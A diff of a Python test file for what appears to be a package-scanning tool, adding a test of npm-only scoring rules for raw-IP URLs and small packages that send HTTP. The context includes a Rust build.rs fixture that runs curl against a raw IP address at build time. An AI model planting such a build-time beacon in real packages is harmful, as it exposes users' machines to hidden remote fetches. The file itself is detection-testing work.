@@ -38,6 +38,19 @@ def test_behaviour_rules_raise_the_funnel_score():
     assert package_features.combine(scan, ["system_info", "http_send"], "pypi") is scan, "npm-only rule"
 
 
+def test_reviewed_rule_lab_signals_are_npm_only():
+    scan = {"score": 0, "level": "none", "findings": [], "rules_matched": []}
+    raw_ip = package_features.combine(scan, ["raw_ip_url"], "npm")
+    assert raw_ip["score"] == 60 and raw_ip["level"] == "warning"
+    assert "BEH_NPM_RAW_IP_URL" in raw_ip["rules_matched"]
+    assert package_features.combine(scan, ["raw_ip_url"], "pypi") is scan
+
+    small_sender = package_features.combine(scan, ["http_send", "tiny_package"], "npm")
+    assert small_sender["score"] == 60 and small_sender["level"] == "warning"
+    assert "BEH_NPM_SMALL_HTTP_SEND" in small_sender["rules_matched"]
+    assert package_features.combine(scan, ["http_send", "tiny_package"], "pypi") is scan
+
+
 def test_build_rs_beacon_rule():
     flags = package_features.profile([("pkg-1.0.0/build.rs", b'fn main(){ std::process::Command::new("curl").arg("-s").arg("http://1.2.3.4/x").status().unwrap(); }')])
     assert {"build_rs", "build_rs_side_effects", "download_tool", "raw_ip_url"} <= set(flags)
